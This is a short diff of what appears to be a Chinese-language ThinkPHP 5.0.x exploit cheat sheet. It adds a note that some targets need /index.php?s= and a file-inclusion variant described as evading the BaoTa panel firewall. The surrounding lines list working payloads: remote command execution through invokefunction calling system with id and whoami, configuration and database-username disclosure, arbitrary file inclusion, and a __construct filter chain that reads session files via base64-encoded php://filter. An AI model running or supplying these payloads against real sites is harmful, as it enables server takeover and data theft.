@@ -130,9 +130,10 @@ Thinkphp 5.0.7
 Thinkphp 5.0.x
 
 ```
-get:（开兼容模式）
+get:（开兼容模式）(有些地方必须要/index.php?s=)
 /?s=index/think\config/get&name=database.username // 获取配置信息
 /?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
+/s=index/think\Lang/load&file=../../test.jpg    // 包含任意文件(与上面相比去掉\绕过了宝塔)
 /?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 /?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
@@ -154,6 +155,7 @@ post:未开强制路由，或利用变量覆盖达到命令执行
 /?s=captcha&r=cGhwaW5mbygpOw==               ->phpinfo
   _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS90bXAvc2Vzc19oYWhhaGF0ZXN0
 ```
+
 
 Thinkphp 5.1.x
 
